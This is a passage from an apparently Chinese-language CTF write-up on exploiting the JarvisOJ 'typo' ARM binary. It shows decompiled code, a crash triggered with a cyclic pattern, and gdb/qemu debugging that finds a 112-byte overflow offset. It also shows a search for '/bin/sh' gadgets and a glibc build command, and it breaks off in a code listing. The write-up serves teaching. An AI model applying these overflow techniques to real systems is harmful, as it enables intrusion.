+</span></span><span class=line><span class=cl>  <span class=nf>sub_11D04</span><span class=p>(</span><span class=n>off_A1534</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>v9</span><span class=p>,</span> <span class=n>v10</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>v2</span> <span class=o>=</span> <span class=nf>sub_22240</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Let&#39;s Do Some Typing Exercise~</span><span class=se>\n</span><span class=s>Press Enter to get start;</span><span class=se>\n</span><span class=s>Input ~ if you want to quit</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>86</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=nf>sub_12170</span><span class=p>(</span><span class=n>v2</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>10</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nf>sub_FBD4</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>sub_22240</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;------Begin------&#34;</span><span class=p>,</span> <span class=mi>17</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=nf>sub_214CC</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=nf>sub_FE28</span><span class=p>(</span><span class=n>v3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>v15</span> <span class=o>=</span> <span class=nf>sub_21474</span><span class=p>(</span><span class=n>v4</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>do</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=o>++</span><span class=n>v17</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>v14</span> <span class=o>=</span> <span class=nf>sub_10568</span><span class=p>()</span> <span class=o>%</span> <span class=mi>4504</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>sub_11338</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>aAbandon</span><span class=p>[</span><span class=mi>20</span> <span class=o>*</span> <span class=n>v14</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=n>v5</span> <span class=o>=</span> <span class=nf>sub_8D24</span><span class=p>(</span><span class=o>&amp;</span><span class=n>aAbandon</span><span class=p>[</span><span class=mi>20</span> <span class=o>*</span> <span class=n>v14</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=n>v13</span> <span class=o>=</span> <span class=n>v5</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>v5</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=n>v5</span> <span class=o>=</span> <span class=nf>sub_11AC0</span><span class=p>(</span><span class=s>&#34;E.r.r.o.r.&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=o>++</span><span class=n>v16</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=n>v13</span> <span class=o>!=</span> <span class=mi>2</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>v12</span> <span class=o>=</span> <span class=nf>sub_21474</span><span class=p>(</span><span class=n>v5</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>v6</span> <span class=o>=</span> <span class=nf>sub_9428</span><span class=p>(</span><span class=n>v12</span> <span class=o>-</span> <span class=n>v15</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>v11</span> <span class=o>=</span> <span class=nf>sub_9770</span><span class=p>(</span><span class=n>v6</span><span class=p>,</span> <span class=nf>HIDWORD</span><span class=p>(</span><span class=n>v6</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1093567616</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>sub_22240</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;------END------&#34;</span><span class=p>,</span> <span class=mi>15</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>sub_11F80</span><span class=p>(</span><span class=mi>10</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>sub_8DF0</span><span class=p>(</span><span class=n>v17</span> <span class=o>-</span> <span class=mi>1</span><span class=p>,</span> <span class=n>v16</span><span class=p>,</span> <span class=n>v11</span><span class=p>,</span> <span class=nf>HIDWORD</span><span class=p>(</span><span class=n>v11</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>  <span class=nf>sub_11AC0</span><span class=p>(</span><span class=s>&#34;Bye&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>v7</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>发现函数都被去函数名了，分析很困难</p><p>我们考虑对程序进行输入测试</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-3-1><a class=lnlinks href=#hl-3-1> 1</a>
+</span><span class=lnt id=hl-3-2><a class=lnlinks href=#hl-3-2> 2</a>
+</span><span class=lnt id=hl-3-3><a class=lnlinks href=#hl-3-3> 3</a>
+</span><span class=lnt id=hl-3-4><a class=lnlinks href=#hl-3-4> 4</a>
+</span><span class=lnt id=hl-3-5><a class=lnlinks href=#hl-3-5> 5</a>
+</span><span class=lnt id=hl-3-6><a class=lnlinks href=#hl-3-6> 6</a>
+</span><span class=lnt id=hl-3-7><a class=lnlinks href=#hl-3-7> 7</a>
+</span><span class=lnt id=hl-3-8><a class=lnlinks href=#hl-3-8> 8</a>
+</span><span class=lnt id=hl-3-9><a class=lnlinks href=#hl-3-9> 9</a>
+</span><span class=lnt id=hl-3-10><a class=lnlinks href=#hl-3-10>10</a>
+</span><span class=lnt id=hl-3-11><a class=lnlinks href=#hl-3-11>11</a>
+</span><span class=lnt id=hl-3-12><a class=lnlinks href=#hl-3-12>12</a>
+</span><span class=lnt id=hl-3-13><a class=lnlinks href=#hl-3-13>13</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~/P/c/p/l/u/a/jarvisOJ_typo ❯❯❯ qemu-arm ./typo                                                                                                     <span class=o>(</span>.venv<span class=o>)</span> ✘ <span class=m>126</span> master ✱ ◼
+</span></span><span class=line><span class=cl>Let<span class=err>&#39;</span>s Do Some Typing Exercise~
+</span></span><span class=line><span class=cl>Press Enter to get start<span class=p>;</span>
+</span></span><span class=line><span class=cl>Input ~ <span class=k>if</span> you want to quit
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>------Begin------
+</span></span><span class=line><span class=cl>shoe
+</span></span><span class=line><span class=cl>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
+</span></span><span class=line><span class=cl>qemu: uncaught target signal <span class=m>11</span> <span class=o>(</span>Segmentation fault<span class=o>)</span> - core dumped
+</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>    <span class=m>29765</span> segmentation fault <span class=o>(</span>core dumped<span class=o>)</span>  qemu-arm ./typo
+</span></span><span class=line><span class=cl>~/P/c/p/l/u/a/jarvisOJ_typo ❯❯❯ daafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
+</span></span><span class=line><span class=cl>zsh: 文件名过长: daafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
+</span></span><span class=line><span class=cl>~/P/c/p/l/u/a/jarvisOJ_typo ❯❯❯</span></span></code></pre></td></tr></table></div></div><p>发现崩溃点，尝试调试偏移距离</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-4-1><a class=lnlinks href=#hl-4-1>1</a>
+</span><span class=lnt id=hl-4-2><a class=lnlinks href=#hl-4-2>2</a>
+</span><span class=lnt id=hl-4-3><a class=lnlinks href=#hl-4-3>3</a>
+</span><span class=lnt id=hl-4-4><a class=lnlinks href=#hl-4-4>4</a>
+</span><span class=lnt id=hl-4-5><a class=lnlinks href=#hl-4-5>5</a>
+</span><span class=lnt id=hl-4-6><a class=lnlinks href=#hl-4-6>6</a>
+</span><span class=lnt id=hl-4-7><a class=lnlinks href=#hl-4-7>7</a>
+</span><span class=lnt id=hl-4-8><a class=lnlinks href=#hl-4-8>8</a>
+</span><span class=lnt id=hl-4-9><a class=lnlinks href=#hl-4-9>9</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 使用 qemu-arm 模拟调试</span>
+</span></span><span class=line><span class=cl>~/P/c/p/l/u/a/jarvisOJ_typo ❯❯❯ qemu-arm -g <span class=m>1234</span> ./typo
+</span></span><span class=line><span class=cl><span class=c1># 使用 gdb 连接到 qemu-arm</span>
+</span></span><span class=line><span class=cl>~ ❯❯❯ gdb
+</span></span><span class=line><span class=cl>pwndbg&gt; target remote :1234
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>pwndbg&gt; pwn cyclic -l daab
+</span></span><span class=line><span class=cl><span class=m>112</span>
+</span></span><span class=line><span class=cl>This <span class=nb>command</span> is deprecated in Pwndbg. Please use the GDB<span class=err>&#39;</span>s built-in syntax <span class=k>for</span> running shell commands instead: !pwn &lt;args&gt;</span></span></code></pre></td></tr></table></div></div><p>静态链接的程序尝试使用 one_gadget</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-5-1><a class=lnlinks href=#hl-5-1>1</a>
+</span><span class=lnt id=hl-5-2><a class=lnlinks href=#hl-5-2>2</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~/P/c/p/l/u/a/jarvisOJ_typo ❯❯❯ one_gadget ./typo                  <span class=o>(</span>.venv<span class=o>)</span> master ✱ ◼
+</span></span><span class=line><span class=cl><span class=o>[</span>OneGadget<span class=o>]</span> UnsupportedArchitectureError: arm</span></span></code></pre></td></tr></table></div></div><p>看起来不支持，我们只能自己寻找</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-6-1><a class=lnlinks href=#hl-6-1>1</a>
+</span><span class=lnt id=hl-6-2><a class=lnlinks href=#hl-6-2>2</a>
+</span><span class=lnt id=hl-6-3><a class=lnlinks href=#hl-6-3>3</a>
+</span><span class=lnt id=hl-6-4><a class=lnlinks href=#hl-6-4>4</a>
+</span><span class=lnt id=hl-6-5><a class=lnlinks href=#hl-6-5>5</a>
+</span><span class=lnt id=hl-6-6><a class=lnlinks href=#hl-6-6>6</a>
+</span><span class=lnt id=hl-6-7><a class=lnlinks href=#hl-6-7>7</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>LDR</span>     <span class=no>R3</span><span class=p>,</span> <span class=err>=</span><span class=no>dword_A2610</span>
+</span></span><span class=line><span class=cl><span class=nf>LDR</span>     <span class=no>R0</span><span class=p>,</span> <span class=err>=</span><span class=no>aBinSh</span>     <span class=c1>; &#34;/bin/sh&#34;
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>LDR</span>     <span class=no>R2</span><span class=p>,</span> <span class=p>[</span><span class=no>R3</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=nf>ADD</span>     <span class=no>R1</span><span class=p>,</span> <span class=no>SP</span><span class=p>,</span> <span class=c1>#0x150+var_13C
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>STR</span>     <span class=no>R4</span><span class=p>,</span> <span class=p>[</span><span class=no>R5</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=nf>STR</span>     <span class=no>R4</span><span class=p>,</span> <span class=p>[</span><span class=no>R5</span><span class=p>,</span><span class=c1>#(dword_A2454 - 0xA2450)]
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>BL</span>      <span class=no>sub_21654</span></span></span></code></pre></td></tr></table></div></div><p>网上给出方法使用 rizzo 进行符号还原
+但是笔者折腾了一下午都没有成功
+编译了 arm 版本的 glibc 2.27</p><p>笔者使用的编译命令如下:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-7-1><a class=lnlinks href=#hl-7-1>1</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>CFLAGS</span><span class=o>=</span><span class=s2>&#34;-g -O3 -Wno-error&#34;</span> ../glibc-2.26/configure --prefix<span class=o>=</span>/usr --host<span class=o>=</span>arm-linux-gnueabihf --build<span class=o>=</span><span class=k>$(</span>../glibc-2.26/scripts/config.guess<span class=k>)</span> --with-headers<span class=o>=</span>/usr/arm-linux-gnueabihf/include --enable-shared --enable-obsolete-rpc --disable-werrorls</span></span></code></pre></td></tr></table></div></div><p>笔者编译出的 libc.a 的 system.o 中 do_system 实现</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-8-1><a class=lnlinks href=#hl-8-1>  1</a>
+</span><span class=lnt id=hl-8-2><a class=lnlinks href=#hl-8-2>  2</a>
+</span><span class=lnt id=hl-8-3><a class=lnlinks href=#hl-8-3>  3</a>
+</span><span class=lnt id=hl-8-4><a class=lnlinks href=#hl-8-4>  4</a>
+</span><span class=lnt id=hl-8-5><a class=lnlinks href=#hl-8-5>  5</a>
+</span><span class=lnt id=hl-8-6><a class=lnlinks href=#hl-8-6>  6</a>
+</span><span class=lnt id=hl-8-7><a class=lnlinks href=#hl-8-7>  7</a>
+</span><span class=lnt id=hl-8-8><a class=lnlinks href=#hl-8-8>  8</a>
+</span><span class=lnt id=hl-8-9><a class=lnlinks href=#hl-8-9>  9</a>
+</span><span class=lnt id=hl-8-10><a class=lnlinks href=#hl-8-10> 10</a>
+</span><span class=lnt id=hl-8-11><a class=lnlinks href=#hl-8-11> 11</a>
+</span><span class=lnt id=hl-8-12><a class=lnlinks href=#hl-8-12> 12</a>
+</span><span class=lnt id=hl-8-13><a class=lnlinks href=#hl-8-13> 13</a>
+</span><span class=lnt id=hl-8-14><a class=lnlinks href=#hl-8-14> 14</a>
+</span><span class=lnt id=hl-8-15><a class=lnlinks href=#hl-8-15> 15</a>
+</span><span class=lnt id=hl-8-16><a class=lnlinks href=#hl-8-16> 16</a>
+</span><span class=lnt id=hl-8-17><a class=lnlinks href=#hl-8-17> 17</a>
+</span><span class=lnt id=hl-8-18><a class=lnlinks href=#hl-8-18> 18</a>
+</span><span class=lnt id=hl-8-19><a class=lnlinks href=#hl-8-19> 19</a>
+</span><span class=lnt id=hl-8-20><a class=lnlinks href=#hl-8-20> 20</a>
+</span><span class=lnt id=hl-8-21><a class=lnlinks href=#hl-8-21> 21</a>
+</span><span class=lnt id=hl-8-22><a class=lnlinks href=#hl-8-22> 22</a>
+</span><span class=lnt id=hl-8-23><a class=lnlinks href=#hl-8-23> 23</a>
+</span><span class=lnt id=hl-8-24><a class=lnlinks href=#hl-8-24> 24</a>
+</span><span class=lnt id=hl-8-25><a class=lnlinks href=#hl-8-25> 25</a>
+</span><span class=lnt id=hl-8-26><a class=lnlinks href=#hl-8-26> 26</a>
+</span><span class=lnt id=hl-8-27><a class=lnlinks href=#hl-8-27> 27</a>
+</span><span class=lnt id=hl-8-28><a class=lnlinks href=#hl-8-28> 28</a>
+</span><span class=lnt id=hl-8-29><a class=lnlinks href=#hl-8-29> 29</a>
+</span><span class=lnt id=hl-8-30><a class=lnlinks href=#hl-8-30> 30</a>
+</span><span class=lnt id=hl-8-31><a class=lnlinks href=#hl-8-31> 31</a>
+</span><span class=lnt id=hl-8-32><a class=lnlinks href=#hl-8-32> 32</a>
+</span><span class=lnt id=hl-8-33><a class=lnlinks href=#hl-8-33> 33</a>
+</span><span class=lnt id=hl-8-34><a class=lnlinks href=#hl-8-34> 34</a>
+</span><span class=lnt id=hl-8-35><a class=lnlinks href=#hl-8-35> 35</a>
+</span><span class=lnt id=hl-8-36><a class=lnlinks href=#hl-8-36> 36</a>
+</span><span class=lnt id=hl-8-37><a class=lnlinks href=#hl-8-37> 37</a>
+</span><span class=lnt id=hl-8-38><a class=lnlinks href=#hl-8-38> 38</a>
+</span><span class=lnt id=hl-8-39><a class=lnlinks href=#hl-8-39> 39</a>
+</span><span class=lnt id=hl-8-40><a class=lnlinks href=#hl-8-40> 40</a>
+</span><span class=lnt id=hl-8-41><a class=lnlinks href=#hl-8-41> 41</a>
+</span><span class=lnt id=hl-8-42><a class=lnlinks href=#hl-8-42> 42</a>
+</span><span class=lnt id=hl-8-43><a class=lnlinks href=#hl-8-43> 43</a>
+</span><span class=lnt id=hl-8-44><a class=lnlinks href=#hl-8-44> 44</a>
+</span><span class=lnt id=hl-8-45><a class=lnlinks href=#hl-8-45> 45</a>
+</span><span class=lnt id=hl-8-46><a class=lnlinks href=#hl-8-46> 46</a>
+</span><span class=lnt id=hl-8-47><a class=lnlinks href=#hl-8-47> 47</a>
+</span><span class=lnt id=hl-8-48><a class=lnlinks href=#hl-8-48> 48</a>
+</span><span class=lnt id=hl-8-49><a class=lnlinks href=#hl-8-49> 49</a>
+</span><span class=lnt id=hl-8-50><a class=lnlinks href=#hl-8-50> 50</a>
+</span><span class=lnt id=hl-8-51><a class=lnlinks href=#hl-8-51> 51</a>
+</span><span class=lnt id=hl-8-52><a class=lnlinks href=#hl-8-52> 52</a>
+</span><span class=lnt id=hl-8-53><a class=lnlinks href=#hl-8-53> 53</a>
+</span><span class=lnt id=hl-8-54><a class=lnlinks href=#hl-8-54> 54</a>
+</span><span class=lnt id=hl-8-55><a class=lnlinks href=#hl-8-55> 55</a>
+</span><span class=lnt id=hl-8-56><a class=lnlinks href=#hl-8-56> 56</a>
+</span><span class=lnt id=hl-8-57><a class=lnlinks href=#hl-8-57> 57</a>
+</span><span class=lnt id=hl-8-58><a class=lnlinks href=#hl-8-58> 58</a>
+</span><span class=lnt id=hl-8-59><a class=lnlinks href=#hl-8-59> 59</a>
+</span><span class=lnt id=hl-8-60><a class=lnlinks href=#hl-8-60> 60</a>
+</span><span class=lnt id=hl-8-61><a class=lnlinks href=#hl-8-61> 61</a>
+</span><span class=lnt id=hl-8-62><a class=lnlinks href=#hl-8-62> 62</a>
+</span><span class=lnt id=hl-8-63><a class=lnlinks href=#hl-8-63> 63</a>
+</span><span class=lnt id=hl-8-64><a class=lnlinks href=#hl-8-64> 64</a>
+</span><span class=lnt id=hl-8-65><a class=lnlinks href=#hl-8-65> 65</a>
+</span><span class=lnt id=hl-8-66><a class=lnlinks href=#hl-8-66> 66</a>
+</span><span class=lnt id=hl-8-67><a class=lnlinks href=#hl-8-67> 67</a>
+</span><span class=lnt id=hl-8-68><a class=lnlinks href=#hl-8-68> 68</a>
+</span><span class=lnt id=hl-8-69><a class=lnlinks href=#hl-8-69> 69</a>
+</span><span class=lnt id=hl-8-70><a class=lnlinks href=#hl-8-70> 70</a>
+</span><span class=lnt id=hl-8-71><a class=lnlinks href=#hl-8-71> 71</a>
+</span><span class=lnt id=hl-8-72><a class=lnlinks href=#hl-8-72> 72</a>
+</span><span class=lnt id=hl-8-73><a class=lnlinks href=#hl-8-73> 73</a>
+</span><span class=lnt id=hl-8-74><a class=lnlinks href=#hl-8-74> 74</a>
+</span><span class=lnt id=hl-8-75><a class=lnlinks href=#hl-8-75> 75</a>
+</span><span class=lnt id=hl-8-76><a class=lnlinks href=#hl-8-76> 76</a>
+</span><span class=lnt id=hl-8-77><a class=lnlinks href=#hl-8-77> 77</a>
+</span><span class=lnt id=hl-8-78><a class=lnlinks href=#hl-8-78> 78</a>
+</span><span class=lnt id=hl-8-79><a class=lnlinks href=#hl-8-79> 79</a>
+</span><span class=lnt id=hl-8-80><a class=lnlinks href=#hl-8-80> 80</a>
+</span><span class=lnt id=hl-8-81><a class=lnlinks href=#hl-8-81> 81</a>
+</span><span class=lnt id=hl-8-82><a class=lnlinks href=#hl-8-82> 82</a>
+</span><span class=lnt id=hl-8-83><a class=lnlinks href=#hl-8-83> 83</a>
+</span><span class=lnt id=hl-8-84><a class=lnlinks href=#hl-8-84> 84</a>
+</span><span class=lnt id=hl-8-85><a class=lnlinks href=#hl-8-85> 85</a>
+</span><span class=lnt id=hl-8-86><a class=lnlinks href=#hl-8-86> 86</a>
+</span><span class=lnt id=hl-8-87><a class=lnlinks href=#hl-8-87> 87</a>
+</span><span class=lnt id=hl-8-88><a class=lnlinks href=#hl-8-88> 88</a>
+</span><span class=lnt id=hl-8-89><a class=lnlinks href=#hl-8-89> 89</a>
+</span><span class=lnt id=hl-8-90><a class=lnlinks href=#hl-8-90> 90</a>
+</span><span class=lnt id=hl-8-91><a class=lnlinks href=#hl-8-91> 91</a>
+</span><span class=lnt id=hl-8-92><a class=lnlinks href=#hl-8-92> 92</a>
+</span><span class=lnt id=hl-8-93><a class=lnlinks href=#hl-8-93> 93</a>
+</span><span class=lnt id=hl-8-94><a class=lnlinks href=#hl-8-94> 94</a>
+</span><span class=lnt id=hl-8-95><a class=lnlinks href=#hl-8-95> 95</a>
+</span><span class=lnt id=hl-8-96><a class=lnlinks href=#hl-8-96> 96</a>
+</span><span class=lnt id=hl-8-97><a class=lnlinks href=#hl-8-97> 97</a>
+</span><span class=lnt id=hl-8-98><a class=lnlinks href=#hl-8-98> 98</a>
+</span><span class=lnt id=hl-8-99><a class=lnlinks href=#hl-8-99> 99</a>
+</span><span class=lnt id=hl-8-100><a class=lnlinks href=#hl-8-100>100</a>
+</span><span class=lnt id=hl-8-101><a class=lnlinks href=#hl-8-101>101</a>
+</span><span class=lnt id=hl-8-102><a class=lnlinks href=#hl-8-102>102</a>
+</span><span class=lnt id=hl-8-103><a class=lnlinks href=#hl-8-103>103</a>
+</span><span class=lnt id=hl-8-104><a class=lnlinks href=#hl-8-104>104</a>
+</span><span class=lnt id=hl-8-105><a class=lnlinks href=#hl-8-105>105</a>
+</span><span class=lnt id=hl-8-106><a class=lnlinks href=#hl-8-106>106</a>
+</span><span class=lnt id=hl-8-107><a class=lnlinks href=#hl-8-107>107</a>
+</span><span class=lnt id=hl-8-108><a class=lnlinks href=#hl-8-108>108</a>
+</span><span class=lnt id=hl-8-109><a class=lnlinks href=#hl-8-109>109</a>
+</span><span class=lnt id=hl-8-110><a class=lnlinks href=#hl-8-110>110</a>
+</span><span class=lnt id=hl-8-111><a class=lnlinks href=#hl-8-111>111</a>
+</span><span class=lnt id=hl-8-112><a class=lnlinks href=#hl-8-112>112</a>
+</span><span class=lnt id=hl-8-113><a class=lnlinks href=#hl-8-113>113</a>
+</span><span class=lnt id=hl-8-114><a class=lnlinks href=#hl-8-114>114</a>
+</span><span class=lnt id=hl-8-115><a class=lnlinks href=#hl-8-115>115</a>
+</span><span class=lnt id=hl-8-116><a class=lnlinks href=#hl-8-116>116</a>
+</span><span class=lnt id=hl-8-117><a class=lnlinks href=#hl-8-117>117</a>
+</span><span class=lnt id=hl-8-118><a class=lnlinks href=#hl-8-118>118</a>
+</span><span class=lnt id=hl-8-119><a class=lnlinks href=#hl-8-119>119</a>
+</span><span class=lnt id=hl-8-120><a class=lnlinks href=#hl-8-120>120</a>
+</span><span class=lnt id=hl-8-121><a class=lnlinks href=#hl-8-121>121</a>
+</span><span class=lnt id=hl-8-122><a class=lnlinks href=#hl-8-122>122</a>
+</span><span class=lnt id=hl-8-123><a class=lnlinks href=#hl-8-123>123</a>
+</span><span class=lnt id=hl-8-124><a class=lnlinks href=#hl-8-124>124</a>
+</span><span class=lnt id=hl-8-125><a class=lnlinks href=#hl-8-125>125</a>
+</span><span class=lnt id=hl-8-126><a class=lnlinks href=#hl-8-126>126</a>
+</span><span class=lnt id=hl-8-127><a class=lnlinks href=#hl-8-127>127</a>
+</span><span class=lnt id=hl-8-128><a class=lnlinks href=#hl-8-128>128</a>
+</span><span class=lnt id=hl-8-129><a class=lnlinks href=#hl-8-129>129</a>
+</span><span class=lnt id=hl-8-130><a class=lnlinks href=#hl-8-130>130</a>
+</span><span class=lnt id=hl-8-131><a class=lnlinks href=#hl-8-131>131</a>
+</span><span class=lnt id=hl-8-132><a class=lnlinks href=#hl-8-132>132</a>
+</span><span class=lnt id=hl-8-133><a class=lnlinks href=#hl-8-133>133</a>
+</span><span class=lnt id=hl-8-134><a class=lnlinks href=#hl-8-134>134</a>
+</span><span class=lnt id=hl-8-135><a class=lnlinks href=#hl-8-135>135</a>
+</span><span class=lnt id=hl-8-136><a class=lnlinks href=#hl-8-136>136</a>
+</span><span class=lnt id=hl-8-137><a class=lnlinks href=#hl-8-137>137</a>
+</span><span class=lnt id=hl-8-138><a class=lnlinks href=#hl-8-138>138</a>
+</span><span class=lnt id=hl-8-139><a class=lnlinks href=#hl-8-139>139</a>
+</span><span class=lnt id=hl-8-140><a class=lnlinks href=#hl-8-140>140</a>
+</span><span class=lnt id=hl-8-141><a class=lnlinks href=#hl-8-141>141</a>
+</span><span class=lnt id=hl-8-142><a class=lnlinks href=#hl-8-142>142</a>
+</span><span class=lnt id=hl-8-143><a class=lnlinks href=#hl-8-143>143</a>
+</span><span class=lnt id=hl-8-144><a class=lnlinks href=#hl-8-144>144</a>
+</span><span class=lnt id=hl-8-145><a class=lnlinks href=#hl-8-145>145</a>
+</span><span class=lnt id=hl-8-146><a class=lnlinks href=#hl-8-146>146</a>
+</span><span class=lnt id=hl-8-147><a class=lnlinks href=#hl-8-147>147</a>
+</span><span class=lnt id=hl-8-148><a class=lnlinks href=#hl-8-148>148</a>
+</span><span class=lnt id=hl-8-149><a class=lnlinks href=#hl-8-149>149</a>
+</span><span class=lnt id=hl-8-150><a class=lnlinks href=#hl-8-150>150</a>
+</span><span class=lnt id=hl-8-151><a class=lnlinks href=#hl-8-151>151</a>
+</span><span class=lnt id=hl-8-152><a class=lnlinks href=#hl-8-152>152</a>
+</span><span class=lnt id=hl-8-153><a class=lnlinks href=#hl-8-153>153</a>
+</span><span class=lnt id=hl-8-154><a class=lnlinks href=#hl-8-154>154</a>
